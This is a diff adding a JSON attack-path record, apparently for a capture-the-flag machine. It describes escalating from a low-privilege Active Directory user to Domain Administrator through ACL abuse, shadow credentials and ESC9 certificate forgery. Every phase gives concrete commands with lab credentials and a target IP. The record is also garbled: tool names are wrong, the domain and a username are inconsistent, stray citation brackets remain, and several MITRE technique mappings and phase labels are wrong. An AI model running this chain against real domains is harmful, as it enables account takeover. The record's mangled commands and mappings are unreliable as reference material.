@@ -1,0 +1,158 @@
+{
+  "id": "ap-0038",
+  "title": "Active Directory Certificate Services (ADCS) Escalation: Generic All to Domain Administrator via ESC9",
+  "summary": "Chaining misconfigured Active Directory access rights (Write Owner/Generic All) through intermediary users/groups to abuse a vulnerable certificate template (ESC9) associated with a CA Operator account, leading to authentication as the Domain Administrator.",
+  "attack_path_markdown": "### Step 1: Initial Enumeration\nIdentify AD services, domain name, and initial user enumeration using provided credentials.\n\n### Step 2: ADCS Reconnaissance and Target Identification\nRun Certify to identify non-default users who can enroll certificates (Operator CA) and map the shortest path in BloodHound.\n\n### Step 3: ACL Abuse (Privilege Escalation)\nExploit Write Owner over the 'management' group and then Write Members rights to add the initial user ('Judith Mayer') to the group.\n\n### Step 4: Shadow Credentials (Lateral Movement)\nAbuse Generic All rights granted by the 'management' group over the 'Management Service' user to obtain its NTLM hash.\n\n### Step 5: Second Shadow Credential Theft\nUse the 'Management Service' hash to perform Shadow Authentication against the 'CA operator' user, exploiting Generic All to obtain the CA Operator's NTLM hash.\n\n### Step 6: ESC9 Vulnerability Exploitation\nModify the CA Operator's UPN to 'administrator', request a certificate using the vulnerable 'certified authentication' template, and then revert the UPN to enable authentication impersonation.\n\n### Step 7: Actions on Objectives\nAuthenticate using the forged certificate via Evil-WinRM to gain Domain Administrator access.",
+  "kill_chain": [
+    {
+      "phase_order": 1,
+      "phase_name": "Reconnaissance",
+      "description": "Perform network service scanning and initial user enumeration using provided credentials (`JudithMayer`/`Judith09`) . Fix clock skew for potential Kerberos operations .",
+      "actions": [
+        "Run Nmap scan to identify open ports and services .",
+        "Add discovered hostnames and domain name to the hosts file .",
+        "Verify credentials and enumerate domain users .",
+        "Run Certify to enumerate all certificate templates to identify the target CA operator ."
+      ],
+      "tools": ["nmap", "vi", "net exec", "Certify", "ntp date"],
+      "techniques": ["Active Scanning (T1046)", "User Enumeration (T1087.002)", "ADCS Template Enumeration"],
+      "mitre_ids": ["T1046", "T1087.002"],
+      "indicators": ["Domain name leakage (`certified.hdb`)", "Hostname (`dc01`)", "Identification of `CA operator` as a non-default enrollee "],
+      "preconditions": "Initial user credentials (`JudithMayer`, `Judith09`), network connectivity to DC (`10.10.11.41`) .",
+      "expected_outcome": "Identified DC, domain name, and non-default user with enrollment rights (`operator CA`) .",
+      "confidence": 0.9,
+      "commands": [
+        "nmap -sC -sV -vv -oA nmap/certified 10.10.11.41 ",
+        "sudo vi /etc/hosts (add 10.10.11.41 dc01.certified.hdb) ",
+        "net exec SMB 10.10.11.41 -u JudithMayer -p Judith09 --users ",
+        "Certify find -dcip 10.10.11.41 -u JudithMayer -p Judith09 ",
+        "sudo ntpdate 10.10.11.41 "
+      ]
+    },
+    {
+      "phase_order": 2,
+      "phase_name": "Weaponization",
+      "description": "Collect AD data using BloodHound.py and map the ACL chain (Write Owner/Generic All) leading from the starting user (`Judith Mayer`) to the high-value target (`CA Operator`) [7, 8].",
+      "actions": [
+        "Collect AD data using BloodHound.py .",
+        "Ingest data into BloodHound .",
+        "Query shortest path: Judith Mayer -> Management (Write Owner) -> Management Service (Generic All) -> CA Operator (Generic All) ."
+      ],
+      "tools": ["BloodHound.py", "BloodHound (Neo4j/Graph DB)"],
+      "techniques": ["Attack Graph Mapping (T1587.001)", "Data Staging"],
+      "mitre_ids": ["T1587.001"],
+      "indicators": ["Shortest Path identified via Write Owner and Generic All relationships "],
+      "preconditions": "Reconnaissance completed, BloodHound environment configured .",
+      "expected_outcome": "Identified exploitation chain leading to the CA Operator account .",
+      "confidence": 0.9,
+      "commands": [
+        "python3 bloodhound.py -d certified.hdb -u JudithMater -p Judith09 --collect All --nameserver 10.10.11.41 "
+      ]
+    },
+    {
+      "phase_order": 3,
+      "phase_name": "Delivery",
+      "description": "Not applicable in this internal access rights exploitation path.",
+      "actions": [],
+      "tools": [],
+      "techniques": [],
+      "mitre_ids": [],
+      "indicators": [],
+      "preconditions": "",
+      "expected_outcome": "",
+      "confidence": 0.0
+    },
+    {
+      "phase_order": 4,
+      "phase_name": "Exploitation",
+      "description": "Exploit Write Owner over the 'management' group to grant the user WriteMembers rights, allowing membership addition. Then, exploit Generic All rights over the 'Management Service' user to create shadow credentials and extract the NTLM hash [3, 8].",
+      "actions": [
+        "Modify the owner of the 'management' group to 'Judith Mayer' .",
+        "Modify the DACL for 'management' group to grant 'Judith Mayer' the 'WriteMembers' right.",
+        "Add 'Judith Mayer' to the 'management' group [13].",
+        "Use Certify.sh to create shadow credentials for 'management_service' and obtain its NTLM hash ."
+      ],
+      "tools": ["owner_edit.py", "dacl_edit.py", "net RPC group", "Certify.sh"],
+      "techniques": ["Write Owner Abuse (T1098.001)", "Write DACL Abuse (T1484.002)", "Shadow Credentials (T1558.004)"],
+      "mitre_ids": ["T1098.001", "T1484.002", "T1558.004"],
+      "indicators": ["Group owner successfully modified [14]", "New member added to 'management' group ", "NTLM hash obtained for 'management_service' "],
+      "preconditions": "Judith Mayer possesses Write Owner permissions on 'management' group .",
+      "expected_outcome": "NTLM hash for 'management_service' user obtained .",
+      "confidence": 0.9,
+      "commands": [
+        "owner_edit.py certified/JudithMayer:Judith09@10.10.11.41 write_new_owner management ",
+        "dacl_edit.py -rights WriteMembers -princ JudithMayer -target management certified/JudithMayer:Judith09@10.10.11.41",
+        "net RPC group addmem management JudithMater -U certified/JudithMayer%Judith09 -S 10.10.11.41 [13]",
+        "Certify.sh shadowauth -target certified.htb -dcip 10.10.11.41 -u JudithMayer@certified.htb -p Judith09 -account management_service "
+      ]
+    },
+    {
+      "phase_order": 5,
+      "phase_name": "Installation",
+      "description": "Acquire the NTLM hash for the final target account, 'CA operator', by exploiting the Generic All permission that 'management_service' holds over it (via Shadow Authentication) .",
+      "actions": [
+        "Use the acquired 'management_service' NTLM hash to perform Shadow Authentication against the 'CA operator' user .",
+        "Save the NTLM hash for 'CA operator' ."
+      ],
+      "tools": ["Certify.sh"],
+      "techniques": ["Pass the Hash", "Shadow Credentials (T1558.004)"],
+      "mitre_ids": ["T1558.004"],
+      "indicators": ["NTLM hash obtained for 'CA operator' "],
+      "preconditions": "NTLM hash of 'management_service' , Generic All right on CA operator .",
+      "expected_outcome": "NTLM hash for 'CA operator' obtained.",
+      "confidence": 0.9,
+      "commands": [
+        "Certify.sh shadowauth -target certified.htb -dcip 10.10.11.41 -u management_service -hashes :[Management_Service_NTLM_Hash] -account CA operator "
+      ]
+    },
+    {
+      "phase_order": 6,
+      "phase_name": "Command and Control",
+      "description": "Execute the ESC9 vulnerability exploitation chain using the CA operator hash to forge a certificate that impersonates the Domain Administrator .",
+      "actions": [
+        "Modify the User Principal Name (UPN) of 'CA operator' to 'administrator' .",
+        "Request a certificate using the vulnerable template ('certified authentication') on behalf of 'CA operator' (which includes UPN='administrator' in the SAN) .",
+        "Restore the UPN of 'CA operator' to its original value (`ca_operator@certified.htb`) ."
+      ],
+      "tools": ["Certify.sh"],
+      "techniques": ["Certificate Template Misconfiguration (ESC9) (T1649)", "User Principal Name Modification"],
+      "mitre_ids": ["T1649"],
+      "indicators": ["PFX file generated containing the administrator UPN in the Subject Alternate Name (SAN) [20]", "Successful UPN modification and restoration "],
+      "preconditions": "NTLM hash of 'CA operator', knowledge of the vulnerable certificate template ('certified authentication') .",
+      "expected_outcome": "Forger PFX certificate file (`administrator.pfx`) .",
+      "confidence": 0.9,
+      "commands": [
+        "Certify account update -hashes :[CA_Operator_NTLM_Hash] -u CA_Operator -upn administrator -dcip 10.10.11.41 ",
+        "Certify request -hashes :[CA_Operator_NTLM_Hash] -u CA_Operator -ca certified-DC01-CA -template certified_authentication -dcip 10.10.11.41 ",
+        "Certify account update -hashes :[CA_Operator_NTLM_Hash] -u CA_Operator -upn ca_operator@certified.htb -dcip 10.10.11.41 "
+      ]
+    },
+    {
+      "phase_order": 7,
+      "phase_name": "Actions on Objectives",
+      "description": "Final authentication and persistence via Pass the Certificate technique using the forged PFX file, achieving Domain Administrator access.",
+      "actions": [
+        "Use `evil-winrm` to authenticate to the Domain Controller using the forged `administrator.pfx` certificate.",
+        "Verify administrative access."
+      ],
+      "tools": ["evil-winrm"],
+      "techniques": ["Pass the Certificate (T1550.003)", "Remote Services (WinRM)"],
+      "mitre_ids": ["T1550.003", "T1021.006"],
+      "indicators": ["Successful shell access as 'administrator' "],
+      "preconditions": "Valid PFX certificate containing the Administrator UPN and restored CA Operator account UPN .",
+      "expected_outcome": "Domain Administrator shell access.",
+      "confidence": 1.0,
+      "commands": [
+        "evil-winrm -i 10.10.11.41 -u administrator -S administrator.pfx"
+      ]
+    }
+  ],
+  "tactics": ["Reconnaissance", "Credential Access", "Privilege Escalation", "Lateral Movement"],
+  "techniques": ["Certificate Template Misconfiguration (ESC9)", "Shadow Credentials", "Write DACL/Owner Abuse", "Pass the Certificate"],
+  "mitre_ids": ["T1649", "T1558.004", "T1484.002", "T1550.003"],
+  "hosts": ["10.10.11.41", "dc01.certified.hdb"],
+  "privs_obtained": ["domain user (Judith Mayer)", "NTLM Hash (Management Service)", "NTLM Hash (CA Operator)", "Administrator (Domain Admin)"],
+  "confidence": 0.9,
+  "notes": "The attack exploits a long chain of ACL misconfigurations (Write Owner/Generic All) leading to an ESC9 certificate services vulnerability for final Domain Administrator compromise.",
+  "labels": ["attack_path", "adcs", "esc9", "shadowauth", "acl_abuse"]
+}
